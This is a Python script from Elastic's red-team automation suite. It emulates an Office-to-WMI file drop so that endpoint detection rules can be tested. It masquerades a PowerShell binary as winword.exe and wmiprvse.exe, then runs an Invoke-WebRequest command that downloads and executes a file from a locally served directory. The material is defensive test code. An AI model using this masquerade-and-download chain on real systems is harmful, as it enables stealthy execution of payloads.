# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="ca0cc06d-6a8f-4d9b-a9c2-9315c62f924a",
    name="msoffice_file_drop_exec_wmi",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(
            id="7e554c18-6435-41ce-b57b-d0ac3b73817f",
            name="Suspicious Execution via Windows Management Instrumentation",
        ),
        RuleMetadata(id="792411bd-59ef-4ac0-89be-786d52d1a5c8", name="Microsoft Office File Execution via WMI"),
    ],
    techniques=["T1047", "T1566"],
)
def main():
    EXE_FILE = _common.get_resource_path("bin/renamed_posh.exe")

    _, ip, port = _common.serve_dir_over_http()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    winword = "C:\\Users\\Public\\winword.exe"
    wmiprvse = "C:\\Users\\Public\\wmiprvse.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    _common.copy_file(EXE_FILE, winword)
    _common.copy_file(EXE_FILE, wmiprvse)
    _common.copy_file(EXE_FILE, dropped)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    _ = _common.execute_command([winword, "/c", cmd], timeout_secs=10)
    _ = _common.execute_command([wmiprvse, "/c", dropped], timeout_secs=10)
    _common.remove_file(winword)
    _common.remove_file(dropped)
